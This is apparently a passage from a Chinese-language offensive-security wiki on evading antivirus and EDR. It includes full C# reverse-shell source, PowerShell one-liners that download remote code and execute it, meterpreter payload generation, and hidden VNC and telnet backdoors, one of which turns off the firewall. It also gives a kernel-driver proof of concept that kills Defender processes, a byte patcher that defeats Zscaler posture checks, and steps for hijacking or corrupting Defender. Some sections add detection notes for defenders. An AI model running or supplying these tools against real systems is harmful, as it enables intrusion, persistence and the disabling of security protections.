由于 payload 会直接加载到内存中而不会触碰磁盘，我们只需要考虑为整个进程 patch AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有不同：

- **Fork\&Run**

它涉及**启动一个新的牺牲进程**，将你的 post-exploitation 恶意代码注入到该新进程中，执行你的恶意代码，然后在完成后杀掉新进程。这种方法既有优点也有缺点。fork and run 方法的优点是执行发生在我们的 Beacon implant 进程**之外**。这意味着如果我们的 post-exploitation 操作出了问题或被抓到，我们的 **implant 存活下来的机会要大得多。** 缺点是你被 **Behavioural Detections** 抓到的 **概率更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这是把 post-exploitation 恶意代码**注入到其自身进程中**。这样，你可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出错，**丢失 beacon** 的 **概率更大**，因为它可能崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想阅读更多关于 C# Assembly loading 的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以 **从 PowerShell** 加载 C# Assemblies，看看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所提议的那样，可以通过让受感染机器访问 **Attacker Controlled SMB share 上安装的解释器环境**，使用其他语言执行恶意代码。

通过允许访问 SMB share 上的 Interpreter Binaries 和环境，你可以在受感染机器的 **内存中执行这些语言的任意代码**。

该 repo 指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们在 **绕过静态特征** 方面有 **更多灵活性**。使用这些语言的随机、未混淆 reverse shell scripts 进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者 **操纵 access token 或 EDR/AV 之类的 security prouct** 的技术，使其降低权限，这样进程不会死掉，但也没有权限检查恶意活动。

为防止这种情况，Windows 可以 **阻止外部进程** 获取 security processes 的 token handles。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，直接在受害者 PC 上部署 Chrome Remote Desktop，然后用它接管并维持持久化非常容易：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 回到 Chrome Remote Desktop 页面并点击 next。向导随后会要求你授权；点击 Authorize 按钮继续。
4. 执行给定参数并做一些调整：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数，它允许在不使用 GUI 的情况下设置 pin）。


## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你必须在一个系统中同时考虑许多不同来源的 telemetry，所以在成熟环境中几乎不可能做到完全不被检测到。

你面对的每个环境都会有各自的优点和弱点。

我强烈建议你去看一下 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便入门更高级的 Evasion techniques。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是一场来自 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的很棒的演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ，它会**移除 binary 的部分内容**，直到它**找出 Defender** 认为恶意的是哪一部分，并把结果分割给你。\
另一个做**同样事情的是** [**avred**](https://github.com/dobin/avred) ，并提供了一个公开网页服务 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

直到 Windows10，所有 Windows 都自带一个可以安装的 **Telnet server**（需要管理员权限），方法如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**启动**并立即**运行**它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从这里下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要 bin 下载，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用 _Disable TrayIcon_ 选项
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新**创建的文件 _**UltraVNC.ini**_ 放到 **victim** 中

#### **Reverse connection**

**attacker** 应该在自己的 **host** 上执行二进制 `vncviewer.exe -listen 5900`，这样它就会**准备好**接收 reverse **VNC connection**。然后，在 **victim** 上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为了保持隐蔽性，你不能做以下几件事

- 如果 `winvnc` 已经在运行，就不要启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可用 `tasklist | findstr winvnc` 检查它是否在运行
- 如果没有在同一目录下放置 `UltraVNC.ini`，就不要启动 `winvnc`，否则会打开 [the config window](https://i.imgur.com/rfMQWcf.png)
- 不要为了获取帮助而运行 `winvnc -h`，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动监听器**，并通过以下方式**执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防御方会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下方式编译它：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与以下内容一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 进行 build injectors 的示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间干掉 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放 ransomware 之前禁用 endpoint protections。该工具自带它**自己的有漏洞但已签名的驱动**，并滥用它来发起特权 kernel 操作，即使是 Protected-Process-Light (PPL) 的 AV services 也无法阻止。

Key take-aways
1. **Signed driver**: 磁盘上投放的文件是 `ServiceMouse.sys`，但其二进制实际是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。由于该驱动带有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将该驱动注册为一个 **kernel service**，第二行启动它，从而让 `\\.\ServiceMouse` 可从 user land 访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于干掉 Defender/EDR services） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除 service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD 完全绕过了 user-mode protections；在 kernel 中执行的代码可以打开 *protected* processes、终止它们，或篡改 kernel objects，而不受 PPL/PP、ELAM 或其他加固特性的影响。

Detection / Mitigation
•  启用 Microsoft 的 vulnerable-driver block list（`HVCI`, `Smart App Control`），让 Windows 拒绝加载 `AToolsKrnl64.sys`。
•  监控新建的 *kernel* services，并在驱动从 world-writable 目录加载或不在 allow-list 中时告警。
•  关注对自定义 device objects 的 user-mode handles，随后出现可疑的 `DeviceIoControl` 调用。

### 通过对磁盘上的二进制文件打补丁绕过 Zscaler Client Connector posture checks

Zscaler 的 **Client Connector** 在本地执行 device-posture 规则，并依赖 Windows RPC 将结果传递给其他组件。两项薄弱的设计使得完全绕过成为可能：

1. posture evaluation 完全在 **client-side** 完成（一个 boolean 被发送到 server）。
2. 内部 RPC endpoints 只验证连接的可执行文件是否由 Zscaler **签名**（通过 `WinVerifyTrust`）。

通过**修改磁盘上的四个已签名二进制文件**，这两种机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都显示合规 |
| `ZSAService.exe` | 到 `WinVerifyTrust` 的间接调用 | NOP-ed ⇒ 任何进程（即使未签名）都可以绑定到 RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被短路 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启服务堆栈后：

* **所有** posture checks 都显示为 **green/compliant**。
* 未签名或被修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机获得对 Zscaler policies 定义的内部网络的无限制访问。

这个 case study 展示了纯客户端信任决策和简单的签名检查如何会被少量字节补丁击败。

## 利用 Protected Process Light (PPL) 通过 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行 signer/level 层级，因此只有同等或更高受保护级别的进程才能相互篡改。从 offensive 角度看，如果你能合法启动一个启用了 PPL 的 binary 并控制其参数，你就可以把 benign 功能（例如 logging）转化为一个受限的、由 PPL 支持的写入 primitive，用于针对 AV/EDR 使用的受保护目录。

是什么让一个 process 以 PPL 运行
- 目标 EXE（以及任何已加载的 DLLs）必须使用支持 PPL 的 EKU 进行签名。
- 必须使用 CreateProcess 并带上以下 flags 创建该 process：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与 binary 的 signer 匹配的兼容 protection level（例如，anti-malware signers 使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows signers 使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 level 会在创建时失败。

另请参见这里关于 PP/PPL 和 LSASS protection 的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- 开源 helper：CreateProcessAsPPL（选择 protection level 并将参数转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 已签名的系统二进制 `C:\Windows\System32\ClipUp.exe` 会自我启动，并接受一个参数，将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入会带有 PPL backing。
- ClipUp 无法解析包含空格的路径；使用 8.3 short paths 指向通常受保护的位置。

8.3 short path helpers
- 列出 short names: 在每个父目录中使用 `dir /x`。
- 在 cmd 中推导 short path: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用 launcher（例如 CreateProcessAsPPL）启动支持 PPL 的 LOLBIN（ClipUp），并带上 `CREATE_PROTECTED_PROCESS`。
2) 传入 ClipUp 的 log-path 参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有需要，使用 8.3 short names。
3) 如果目标二进制通常在运行时被 AV 打开/锁定（例如 `MsMpEng.exe`），则通过安装一个能更早运行的 auto-start service，将写入安排在 boot 时、AV 启动之前。使用 Process Monitor（boot logging）验证 boot ordering。
4) 重启后，带 PPL backing 的写入会在 AV 锁定其二进制之前发生，损坏目标文件并阻止启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- Timing is critical: the target must not be open; boot-time execution avoids file locks.

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: restrict which signed binaries may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.
- Service hygiene: restrict creation/modification of auto-start services and monitor start-order manipulation.
- Ensure Defender tamper protection and early-launch protections are enabled; investigate startup errors indicating binary corruption.
- Consider disabling 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 通过 Platform Version Folder Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下路径下的子文件夹来选择运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序版本字符串最高的子文件夹（例如 `4.18.25070.5-0`），然后从那里启动 Defender 服务进程（并相应更新 service/registry 路径）。这个选择信任目录项，包括目录 reparse points（symlinks）。管理员可以利用这一点将 Defender 重定向到攻击者可写路径，并实现 DLL sideloading 或 service disruption。

前置条件
- Local Administrator（需要在 Platform 文件夹下创建目录/symlink）
- 能够 reboot 或触发 Defender 平台重新选择（boot 时 service restart）
- 只需要内置工具（mklink）

为什么有效
- Defender 会阻止对自身目录的写入，但它的平台选择信任目录项，并且会选择字典序最高的版本，而不会验证目标是否解析到受保护/可信路径。

步骤（示例）
1) 准备当前平台文件夹的一个可写克隆，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2）在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该观察到 `C:\TMP\AV\` 下的新进程路径，以及反映该位置的服务配置/registry。

Post-exploitation options
- DLL sideloading/code execution: 投放/替换 Defender 从其 application directory 加载的 DLL，以在 Defender 的进程中执行代码。参见上面的部分：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: 移除 version-symlink，这样在下次启动时，配置的路径无法解析，Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意，这种技术本身不提供提权；它需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以通过 hooking 目标模块的 Import Address Table (IAT)，并将选定的 APIs 重定向到由攻击者控制的、position‑independent code (PIC)，把运行时规避从 C2 implant 转移到目标模块本身。这将规避能力从许多工具包暴露的狭小 API 面扩展出去（例如 CreateProcessA），并把同样的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- 使用 reflective loader（前置或伴随）在目标模块旁边加载一个 PIC blob。PIC 必须是自包含且 position‑independent 的。
- 当宿主 DLL 加载时，遍历它的 IMAGE_IMPORT_DESCRIPTOR，并将目标 imports（例如 CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）的 IAT 条目 patch 到简短的 PIC wrappers 上。
- 每个 PIC wrapper 在尾调用真实 API 地址之前执行 evasions。典型 evasions 包括：
- 调用前后的内存 mask/unmask（例如，加密 beacon 区域，RWX→RX，修改页面名称/权限），然后在调用后恢复。
- Call-stack spoofing：构造一个良性的 stack，并进入目标 API，使 call-stack analysis 解析到预期的 frames。
- 为了兼容性，导出一个接口，以便 Aggressor script（或等效脚本）可以注册要为 Beacon、BOFs 和 post-ex DLLs hook 的 APIs。

为什么这里使用 IAT hooking
- 适用于任何使用被 hook import 的代码，而无需修改工具代码，也不依赖 Beacon 去代理特定 APIs。
- 覆盖 post-ex DLLs：hooking LoadLibrary* 让你可以拦截模块加载（例如 System.Management.Automation.dll, clr.dll），并将同样的 masking/stack evasion 应用于它们的 API 调用。
- 通过用 CreateProcessA/W 包装器，恢复对基于 call-stack 的检测仍然可靠的进程启动类 post-ex 命令的使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 在重定位/ASLR 之后、首次使用 import 之前应用 patch。像 TitanLdr/AceLdr 这样的 reflective loaders 展示了在已加载模块的 `DllMain` 期间进行 hooking。
- 保持 wrappers 足够小且 PIC-safe；通过你在 patch 前捕获的原始 IAT 值，或通过 `LdrGetProcedureAddress` 解析真实 API。
- 对 PIC 使用 RW → RX 过渡，避免留下 writable+executable 页面。

Call‑stack spoofing stub
- Draugr 风格的 PIC stubs 会构建一条伪造的 call chain（返回地址指向良性模块），然后再 pivot 到真实 API。
- 这会绕过那些期望 Beacon/BOFs 到敏感 API 具有标准 canonical stack 的检测。
- 配合 stack cutting/stack stitching 技术，在 API prologue 之前落入预期的 frames 内。

Operational integration
- 将 reflective loader 追加到 post-ex DLLs 前面，这样在 DLL 被加载时 PIC 和 hooks 会自动初始化。
- 使用 Aggressor script 注册目标 APIs，让 Beacon 和 BOFs 在无需代码更改的情况下，透明地受益于同一条 evasion path。

Detection/DFIR considerations
- IAT integrity：条目解析到非 image（heap/anon）地址；定期验证 import pointers。
- Stack anomalies：返回地址不属于已加载 images；突然跳转到非 image PIC；RtlUserThreadStart 祖先关系不一致。
- Loader telemetry：进程内对 IAT 的写入、会修改 import thunks 的早期 `DllMain` 活动、加载时创建的意外 RX 区域。
- Image-load evasion：如果 hooking `LoadLibrary*`，监控与 memory masking events 相关联的 automation/clr assemblies 的可疑加载。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 reflective loaders（例如 TitanLdr, AceLdr）
- Memory masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如 Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

如果你控制一个 reflective loader，你可以在 `ProcessImports()` 期间通过将 loader 的 `GetProcAddress` 指针替换为一个自定义 resolver 来 hook imports，这个 resolver 会优先检查 hooks：

- 构建一个 **resident PICO**（persistent PIC object），在瞬态 loader PIC 自释放后仍然存活。
- 导出一个 `setup_hooks()` 函数，覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中，跳过 ordinal imports，并使用基于 hash 的 hook lookup，例如 `__resolve_hook(ror13hash(name))`。如果 hook 存在，就返回它；否则委托给真实的 `GetProcAddress`。
- 在链接时通过 Crystal Palace `addhook "MODULE$Func" "hook"` 条目注册 hook targets。由于 hook 位于 resident PICO 内，它会一直有效。

这会在 **import-time** 实现 IAT redirection，而无需在加载后 patch 已加载 DLL 的 code section。

### Forcing hookable imports when the target uses PEB-walking

只有当函数 वास्तव在 target 的 IAT 中时，import-time hooks 才会触发。如果某个模块通过 PEB-walk + hash 解析 APIs（没有 import entry），就强制生成真实 import，让 loader 的 `ProcessImports()` 路径能看到它：

- 将 hashed export resolution（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为直接引用，例如 `&WaitForSingleObject`。
- 编译器会生成一个 IAT entry，从而在 reflective loader 解析 imports 时可以被拦截。

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

不要 patch `Sleep`，而是 hook implant 实际使用的 **wait/IPC primitives**（`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`）。对于长时间等待，可将调用包裹进一个 Ekko-style obfuscation chain，在 idle 期间加密内存中的映像：

- 使用 `CreateTimerQueueTimer` 调度一串回调，这些回调调用带有构造 `CONTEXT` frames 的 `NtContinue`。
- 典型 chain（x64）：将 image 设为 `PAGE_READWRITE` → 通过 `advapi32!SystemFunction032` 对整个 mapped image 执行 RC4 encrypt → 执行阻塞等待 → RC4 decrypt → 通过遍历 PE sections **恢复每个 section 的权限** → 发送完成信号。
- `RtlCaptureContext` 提供一个模板 `CONTEXT`；将其复制到多个 frames，并设置寄存器（`Rip/Rcx/Rdx/R8/R9`）以调用每一步。

Operational detail：对长等待返回 “success”（例如 `WAIT_OBJECT_0`），这样 caller 会在 image 被 masked 时继续执行。这个模式可以在 idle 窗口中隐藏模块，并避免经典的 “patched `Sleep()`” 特征。

Detection ideas (telemetry-based)
- 大量 `CreateTimerQueueTimer` 回调指向 `NtContinue`。
